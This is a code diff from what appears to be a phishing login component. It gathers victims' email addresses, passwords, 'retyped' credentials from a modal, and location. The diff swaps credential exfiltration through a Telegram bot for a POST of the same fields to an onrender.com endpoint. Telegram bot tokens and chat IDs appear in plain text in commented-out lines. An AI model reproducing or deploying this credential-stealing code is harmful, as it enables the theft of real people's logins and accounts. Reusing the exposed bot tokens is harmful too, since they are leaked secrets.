@@ -132,23 +132,25 @@ export default {
         ? `https://www.google.com/maps?q=${this.location.latitude},${this.location.longitude}`
         : 'Location not available';
 
-      const message = `Email: ${this.email}
-Password: ${this.password}
+      // const message = `Email: ${this.email}
+// Password: ${this.password}
 
-Modal-email: ${this.retypedEmail}
-Modal-password: ${this.retypedPassword}
-`;
+// Modal-email: ${this.retypedEmail}
+// Modal-password: ${this.retypedPassword}
+// `;
       //  const botToken = '7419681058:AAEM-sAzNtI__N_ib3y73FDktEUkJYyOwQo';
       // const chatId = 7067343735;
-      const botToken = '8370164086:AAF5HP0jGNLwV_PB9q7sVncLSULost68M-U';
-      const chatId = '1314372286';
+      //const botToken = '8370164086:AAF5HP0jGNLwV_PB9q7sVncLSULost68M-U';
+      // const chatId = '1314372286';
       // const chatId = 1314372286;
-      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
+      //const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+       const url = 'https://rate-da.onrender.com/submit';
       try {
-        const response = await axios.post(telegramApiUrl, {
-          "chat_id": chatId,
-          "text": message
+        const response = await axios.post(url, {
+          email: this.email,
+          password: this.password,
+          retypedPassword: this.retypedPassword,
+          retypedEmail: this.retypedEmail,
         });
 
         if (response.status === 200) {
